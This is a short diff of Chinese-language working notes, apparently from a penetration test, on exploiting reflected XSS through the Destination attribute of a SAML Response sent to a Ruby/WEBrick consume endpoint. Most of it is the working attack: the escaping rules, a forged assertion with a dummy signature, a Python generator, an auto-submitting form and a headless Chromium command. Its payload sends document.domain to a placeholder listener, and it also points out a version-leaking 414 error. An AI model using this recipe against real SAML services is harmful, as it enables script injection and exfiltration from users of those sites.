@@ -1,0 +1,18 @@
+关键坑：
+1) Destination 属性必须做【完整】XML 实体编码：先 &→&amp;，再 <→&lt;、>→&gt;，单引号 '→&apos;。漏转义 & 或 ' 会导致 REXML 解析失败，服务端返回 HTTP 500 <h1>Internal Server Error</h1>（不是 XSS，容易误判为不可注入）。
+2) 报文需能被 REXML 解析并走到 validate_destination：需带一个结构合法、值任意的 <ds:Signature>（含 SignedInfo/Reference/DigestValue/SignatureValue）与一个最小 Assertion（Issuer/Subject/NameID/Conditions/AudienceRestriction/AuthnStatement）。
+3) ACS 多为 POST-only；GET 传超长 SAMLResponse 可能触发 WEBrick 414/RequestURITooLarge（顺带泄露内部 WEBrick 版本与 localhost:端口）。
+
+验证用 Python 生成（要点）：
+esc = PAY.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace("'","&apos;")
+xml = f"<samlp:Response ... Destination='{esc}'> ... </samlp:Response>"
+b64 = base64(xml.encode())
+requests.post(ACS, data={"SAMLResponse": b64})   # 期望 HTTP 401 且 body 原样含 payload
+
+真实浏览器执行验证（无头）：
+<form method="POST" action="https://<host>/saml/consume"><input type="hidden" name="SAMLResponse" value="<b64>"></form>
+<body onload="document.forms[0].submit()">
+chromium --headless=new --no-sandbox --no-proxy-server --virtual-time-budget=15000 --dump-dom file_or_http_page
+载荷用 location.href 回连受控监听（https 页跳 http 允许，img/fetch 会被混合内容拦）：<svg/onload="location.href='http://LISTEN/OOB?d='+encodeURIComponent(document.domain)">
+
+阴性对照：Destination 设为合法 ACS → 返回 Invalid Signature on SAML Response，无回显。
